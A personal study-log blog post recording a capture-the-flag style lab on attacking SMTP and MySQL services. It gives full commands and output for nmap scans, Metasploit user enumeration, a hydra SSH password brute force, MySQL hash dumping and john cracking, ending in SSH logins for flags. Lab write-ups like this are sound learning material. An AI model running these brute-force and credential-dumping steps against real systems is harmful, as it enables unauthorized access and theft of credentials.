---
title: Day 17
date: 2022-04-30
layout: post.njk
tags: daily
---

{{ page.date.toDateString }}

I'm getting a jump on doing this today. Hopefully I can finish the whole module.

For task 2 for SMTP were going to use Metasploit to enumerate the users available on the server using the [smtp_version](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/smtp/smtp_version.md). Its my first time using Metasploit in THM so it should be interesting.


First I ran my Nmap scan:
>`nmap -sS <ip> -p 1-10000`
>
>`Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-30 12:55 BST`
>
>`Nmap scan report for <ip>.eu-west-1.compute.internal (<ip)`
>
>`Host is up (0.00058s latency).`
>
>`Not shown: 9998 closed ports`
>
>`PORT   STATE SERVICE`
>
>`22/tcp open  ssh`
>
>`25/tcp open  smtp`
>
>`MAC Address: 02:1C:AF:59:C1:05 (Unknown)`
>
>`Nmap done: 1 IP address (1 host up) scanned in 5.32 seconds`

The I ran the following commands in Metasploit:

>`msfconsole`
>
>`smtp_version`
>
>`use auxiliary/scanner/smtp/smtp_version`
>
>`set RHOSTS <ip>`
>
>`run`
>
>`[+] <ip>     - <ip>:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a`
>
>`[*] <ip>      - Scanned 1 of 1 hosts (100% complete)`
>
>`[*] Auxiliary module execution completed`
>
>`search smtp_enum`
>
>`use auxiliary/scanner/smtp/smtp_enum`
>
>`set RHOSTS <ip>`
>
>`set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt`
>
>`run`
>
>`[*] <ip>      - <ip>  Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)`
>
>`[+] <ip>       - <ip>  Users found: administrator`
>
>`[*] <ip>       - Scanned 1 of 1 hosts (100% complete)`
>
>`[*] Auxiliary module execution completed`

Now we know we have a user name: `administrator` on the system and we are going to use [hydra](https://www.kali.org/tools/hydra/) to brute force it.

I ran:

>`hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.221.111 ssh`

Then I ssh'ed in and got the flag!

Last one in this module: MySQL

MySQL is a Relational Database Management System (RDMS).

MySQL uses a client server model and can run on Linux and Windows.

First in the exercise it gives us the credentials `root:password`.

I run my Nmap scan:
>`nmap -sS <ip> -p 1-10000`
>
>`Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-30 13:30 BST`
>
>`Nmap scan report for <ip>.eu-west-1.compute.internal (<ip)`
>`Host is up (0.0011s latency).`
>
>`Not shown: 9998 closed ports`
>
>`PORT     STATE SERVICE`
>
>`22/tcp   open  ssh`
>
>`3306/tcp open  mysql`
>`MAC Address: 02:52:51:2B:7F:0F (Unknown)`
>
>`Nmap done: 1 IP address (1 host up) scanned in 5.50 seconds`

I verified that I could connect to MySQL using the client:
>`mysql -h <ip> -u root -p`

Then I moved into Metasploit:
>`msfconsle`
>
>`search mysql_sql`
>
>`use auxiliary/admin/mysql/mysql_sql`

I then set all the options for RHOST, USERNAME, and PASSWORD. If you run without setting the SQL option it runs `select version()`. After I ran I got results back for that and I changed SQL to `show databases` and I got back the databases on the system.
>`msf5 auxiliary(admin/mysql/mysql_sql) > run`
>
>`[*] Running module against <ip>`
>
>`[*] <ip>:3306 - Sending statement: 'show databases'...`
>`[*] <ip>:3306 -  | information_schema |`
>`[*] <ip>:3306 -  | mysql |`
>`[*] <ip>:3306 -  | performance_schema |`
>`[*] <ip>:3306 -  | sys |`
>`[*] Auxiliary module execution completed`

I then used `auxiliary/scanner/mysql/mysql_schemadump`  to dump the various table schemas and `auxiliary/scanner/mysql/mysql_hashdump` to dump the password hashes.

In the list of password hashes there was: `carl:*EA031893AA21444B170FC2162A56978B8CEECE18` so I put that in a text file called `hash.txt` and ran:
>`john hash.txt`

and got: `doggie           (carl)`

I then reused those credentials for ssh and was able to get the final flag.

This module was great just like the first one. I got exposure to a lot of tools and started to get the basics of Metasploit down. I think Metasploit is kind of looked down upon because it kind of a crutch and does a lot of work for you without understanding what is going on. For now though Its helpful to use.

I think one of the big things I learned from these is that an attack path involves pivots from one service to another. You may exploit some service that gives you some info that you use with another service, which leads you to more info and maybe the ability to gain a shell.

Here a couple extra links for more reading:
[VPN exploits](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)
[Common Exploits](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html)